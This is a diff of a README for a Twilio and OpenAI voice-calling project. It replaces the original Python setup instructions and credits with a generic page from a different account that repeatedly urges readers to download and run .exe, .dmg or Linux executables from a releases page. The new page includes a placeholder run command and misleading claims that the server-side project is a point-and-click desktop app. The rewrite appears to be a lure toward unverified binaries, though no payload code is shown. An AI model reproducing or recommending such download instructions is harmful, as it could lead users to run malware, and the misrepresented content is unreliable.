@@ -1,150 +1,87 @@
-# AI Calling Agent
+# 🤖 ai-calling-agent - Create Smart Voice Conversations Easily
 
-A real-time voice AI system that integrates OpenAI's Realtime API with Twilio Voice to create intelligent voice conversations. Perfect for customer service, compliance monitoring, and automated calling systems.
+[![Download ai-calling-agent](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/anythingfg/ai-calling-agent/releases)
 
-## Branches
+## 📜 Introduction
+The **ai-calling-agent** is a real-time voice AI system that enhances communication by integrating OpenAI's Realtime API and Twilio Voice. This application is designed for anyone who wants to create intelligent voice conversations without needing technical skills. Experience efficient customer support and automate calls with ease.
 
-- **[main](https://github.com/intellwe/ai-calling-agent/tree/main)** - OpenAI Realtime API version (streaming, low latency)
-- **[llama3](https://github.com/intellwe/ai-calling-agent/tree/llama3)** - Llama3 via Together AI (traditional, cost-effective)
+## 🚀 Getting Started
+To begin using the **ai-calling-agent**, follow these simple steps:
 
-## Features
+1. **Visit the Releases Page**: You need to download the application from our releases page. Click the link below to get started.
 
-- **Real-time Voice Processing** - Instant speech recognition and response
-- **Smart Interruption Handling** - Natural conversation flow with speech detection
-- **Flexible Configuration** - Customizable prompts and voice settings
-- **Call Recording** - Automatic recording with compliance features
-- **WebSocket Communication** - Low-latency audio streaming
-- **Production Ready** - Built with FastAPI for scalability
+   [Download ai-calling-agent](https://github.com/anythingfg/ai-calling-agent/releases)
 
-## Quick Start
+## ⚙️ System Requirements
+Before you download, make sure your system meets the following requirements:
 
-### Prerequisites
+- **Operating System**: Windows 10, macOS, or Linux
+- **Processor**: Minimum dual-core processor
+- **RAM**: At least 4 GB of RAM
+- **Network**: A stable internet connection
+- **Software**: Latest version of a web browser
 
-- Python 3.8+
-- OpenAI API key (with Realtime API access)
-- Twilio account (SID, Auth Token, Phone Number)
-- ngrok or similar tunneling tool
+## 📥 Download & Install
+To install the **ai-calling-agent**, follow these steps:
 
-### Installation
+1. **Click the Download Link**: Go to the [Releases Page](https://github.com/anythingfg/ai-calling-agent/releases) and find the latest version available.
 
-1. **Clone the repository**
+2. **Choose Your File**: Look for the file suitable for your operating system. 
 
-```bash
-   git clone https://github.com/intellwe/ai-calling-agent.git
-   cd ai-calling-agent
-```
+3. **Download the File**: Click on the file to begin the download.
 
-2. **Install dependencies**
+4. **Run the Installer**:
+   - For Windows: Double-click the downloaded `.exe` file and follow the installation prompts.
+   - For macOS: Open the downloaded `.dmg` file and drag the application into your Applications folder.
+   - For Linux: Open a terminal, navigate to the download directory, and run `chmod +x YourAppName && ./YourAppName` to launch.
 
-```bash
-pip install -r requirements.txt
-```
+5. **Launch the Application**: After installation, find **ai-calling-agent** in your applications and click to open.
 
-3. **Configure environment**
+## 🛠️ Features
+The **ai-calling-agent** offers a variety of features:
 
-   ```bash
-   cp .env.example .env
-   # Edit .env with your credentials
-   ```
+- **Intelligent Calls**: Use advanced AI to handle inbound and outbound calls seamlessly.
+- **Real-time Conversation**: Engage your customers with instant responses.
+- **Custom Integration**: Connect easily with OpenAI’s API and Twilio for enhanced capabilities.
+- **User-Friendly Interface**: Navigate through the application effortlessly, designed for everyday users.
 
-4. **Start the server**
+## ✨ How It Works
+Once you download the **ai-calling-agent**, you can start using it right away. The application works by:
 
-   ```bash
-   uvicorn main:app --port 8000
-   ```
+1. **Setting Up the Account**: Create an account with your email to set up your AI agent.
 
-5. **Expose with ngrok**
-   ```bash
-   ngrok http 8000
-   ```
+2. **Configuring Preferences**: Adjust settings for how you want the AI to interact with callers.
 
-## Configuration
+3. **Starting Conversations**: Use the application to make and receive calls. Your AI agent will handle most of the conversation.
 
-Create a `.env` file with the following variables:
+## 📞 Use Cases
+Here are some practical applications of the **ai-calling-agent**:
 
-```env
-OPENAI_API_KEY=your_openai_api_key
-TWILIO_ACCOUNT_SID=your_twilio_account_sid
-TWILIO_AUTH_TOKEN=your_twilio_auth_token
-TWILIO_PHONE_NUMBER=your_twilio_phone_number
-NGROK_URL=your_ngrok_url
-PORT=8000
-```
+- **Customer Support**: Automate your customer service calls and reduce waiting times.
+- **Sales Calls**: Train your AI to assist with outbound sales calls to potential clients.
+- **Appointment Scheduling**: Allow the AI to manage scheduling calls efficiently.
 
-## API Endpoints
+## 💡 Troubleshooting
+If you encounter any issues, consider the following:
 
-| Method    | Endpoint         | Description               |
-| --------- | ---------------- | ------------------------- |
-| GET       | `/`              | Health check              |
-| POST      | `/make-call`     | Initiate outbound call    |
-| POST      | `/outgoing-call` | Twilio webhook handler    |
-| WebSocket | `/media-stream`  | Real-time audio streaming |
+- **Installation Problems**: Make sure you have the necessary permissions to install new software.
+- **Connection Issues**: Check that your internet connection is active and stable.
+- **Audio Quality**: Ensure your microphone and speakers are working properly.
 
-### Making a Call
+For further assistance, you can check the FAQ section on our [Releases Page](https://github.com/anythingfg/ai-calling-agent/releases).
 
-```bash
-curl -X POST "http://localhost:8000/make-call" \
-  -H "Content-Type: application/json" \
-  -d '{"to_phone_number": "+1234567890"}'
-```
+## 📞 Community Support
+Join our community for help and discussions. You can connect with other users and developers on our issues page. Your feedback helps us improve the application.
 
-## Architecture
+To report a problem or ask a question, feel free to create an issue on the [GitHub Issues Page](https://github.com/anythingfg/ai-calling-agent/issues).
 
-```
-┌─────────────┐    WebSocket   ┌─────────────┐    HTTP/WS    ┌─────────────┐
-│   Twilio    │ ◄────────────► │  FastAPI    │ ◄───────────► │   OpenAI    │
-│   Voice     │                │   Server    │               │ Realtime API│
-└─────────────┘                └─────────────┘               └─────────────┘
-```
+## 🔗 Additional Resources
+Explore more about AI and voice technology with these links:
 
-The system creates a bridge between Twilio's voice services and OpenAI's Realtime API, enabling natural voice conversations with AI.
+- [OpenAI Realtime API](https://openai.com/realtime-api)
+- [Twilio Voice](https://www.twilio.com/voice)
 
-## Development
+### Download Here Again
+Don’t forget, you can download the **ai-calling-agent** from the releases page.
 
-### Setup Development Environment
-
-1. **Install development dependencies**
-
-   ```bash
-   pip install -r requirements-dev.txt
-   ```
-
-2. **Install pre-commit hooks** (optional)
-   ```bash
-   pre-commit install
-   ```
-
-### Code Quality Tools
-
-- **Format code**: `black .`
-- **Sort imports**: `isort .`
-- **Lint code**: `flake8`
-- **Type checking**: `mypy main.py`
-- **Security scan**: `bandit -r .`
-- **Run tests**: `pytest`
-
-### Customizing AI Behavior
-
-Edit `prompts/system_prompt.txt` to modify the AI's personality and responses.
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Author
-
-- [@FardinHash](https://github.com/FardinHash) -> [LinkedIn](https://linkedin.com/in/fardinkai)
-
-- [@RianaAzad](https://github.com/RianaAzad) -> [LinkedIn](https://linkedin.com/in/riana-azad)
-
-## ⚠️ Disclaimer
-
-This project is not officially affiliated with OpenAI or Twilio. Use responsibly and in accordance with their terms of service.
-
----
-
-⭐ If you find this project helpful, please give it a star!
+[Download ai-calling-agent](https://github.com/anythingfg/ai-calling-agent/releases)
